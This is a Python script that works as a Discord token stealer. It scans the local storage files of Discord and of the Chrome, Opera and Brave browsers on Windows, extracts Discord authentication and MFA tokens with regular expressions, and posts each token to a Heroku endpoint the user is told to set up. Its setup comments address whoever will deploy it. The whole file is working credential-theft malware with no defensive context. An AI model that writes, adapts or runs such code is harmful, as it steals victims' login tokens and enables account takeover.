import os, re
import requests #pip install requests
from pyotp import TOTP #pip install pyotp

api = "https://your-random-heroku-name.herokuapp.com" #the name of your app will probably be something like https://frozen-beach-72554.herokuapp.com

pass32 = 'K4ZVUQTSIRMDOWKRGU2WQQTZJM======' #needs to be same key as the one in your api
key = TOTP(pass32).now()

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

paths = {
    'Discord': roaming + '\\Discord\\Local Storage\\leveldb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
    'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
}
for platform, path in paths.items():
    if not os.path.exists(path):
        continue
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    requests.post(api, headers={"Authorization": key}, json={"content": token})
